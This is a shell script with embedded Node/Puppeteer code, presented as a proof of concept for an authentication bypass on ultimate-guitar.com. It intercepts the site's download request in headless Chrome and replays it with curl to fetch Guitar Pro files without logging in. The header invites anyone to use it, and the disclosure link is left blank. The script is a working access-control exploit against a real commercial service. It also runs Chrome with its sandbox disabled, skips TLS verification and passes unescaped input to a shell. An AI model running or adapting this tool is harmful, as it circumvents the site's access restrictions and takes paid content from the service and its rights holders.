#!/usr/bin/env sh                                     
#                                          Jan 14, 2025                                          
#                                 ADMIN]at[DTRH]dot[NET
#        █▀▀ █▀▀ █░░█ █▀▀█ ▒█░▒█ ▒█▀▀▀ ▀█▀ ▒█▀▀▀█ ▀▀█▀▀ 
#        █▀▀ █░░ █▀▀█ █░░█ ▒█▀▀█ ▒█▀▀▀ ▒█░ ░▀▀▀▄▄ ░▒█░░ 
#        ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀▀ ▒█░▒█ ▒█▄▄▄ ▄█▄ ▒█▄▄▄█ ░▒█░░
#
# #####################################################
# PoC - Primary   - Broken Access Policy
#       Secondary - Authentication Bypass
#       [ https://www.ultimate-guitar.com ]

# What is echoHEIST?
# echoHEIST.sh allows anyone to bypass the authentication wall 
# while trying to download guitar pro files from the website 
# above. It leverages nodejs + puppeteer but is run from a 
# linux shell environment:  
#
# Usage: chmod +x echoHEIST.sh && ./echoHEIST.sh [URL]

# The disclosure report can be found here : 
#  

usage() {
  echo "Usage: $0 <URL>"
  exit 1
}

# Check for URL argument
[ -z "$1" ] && usage

# Filename generation is rudementary but works.
iURL="$1"
oName=$(echo "$iURL" | sed -E 's|https://tabs.ultimate-guitar.com/tab/||' | sed 's|/|_|g' | sed -E 's/_GP.*//')

oFile="${oName}.gpx"
echo  "Generated file name: $oFile"

# Short and Sweet
echoHEIST() {
  # shellcheck disable=SC3037
  echo -e "Listening for web requests directed towards \033[1m'tabs.ultimate-guitar.com/download/public/'\033[0m"

  # Start Puppeteer to listen for network requests
  node -e "
    const puppeteer = require('puppeteer');
    const { exec } = require('child_process');

    (async () => {
      const browser = await puppeteer.launch({
        headless: true,
        executablePath: '/opt/chrome/chrome-linux/chrome',            // Path to your browser
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
      });

      const page = await browser.newPage();

      // Enable network request interception
      await page.setRequestInterception(true);
      page.on('request', (request) => {
        const url = request.url();

        // Match the desired request
        if (url.includes('tabs.ultimate-guitar.com/download/public/')) {
          console.log('Captured request: ' + url);

          // Rebuild the curl command
          const headers = Object.entries(request.headers())
            .map(([key, value]) => \`-H '\${key}: \${value}'\`)
            .join(' \\\n  ');

          const curlCommand = \`
            curl -s -k '\${url}' \\
              \${headers} \\
              --output ${oFile}
          \`;

          console.log('Executing curl command...');
          exec(curlCommand, (error, stdout, stderr) => {
            if (error) {
              console.error('Error:', error.message);
              return;
            }
            if (stderr) {
              console.error('Stderr:', stderr);
            }
            console.log('Download complete: ${oFile}');
            // vconsole.log('\x07'); // Beep on completion
          });
        }
        request.continue();
      });

      // Navigate to the provided URL
      console.log('Navigating to ' + '${iURL}');
      await page.goto('${iURL}', { waitUntil: 'networkidle2' });

      // Wait to ensure all requests are captured
      console.log('Waiting for network activity...');
      // await page.waitForTimeout(30000);

      await browser.close();
    })();
  "
}

echoHEIST   # Regex, Replay, Redirect 

# KBS <admin [at] dtrh [dot] net
# https://dtrh.net
# eof
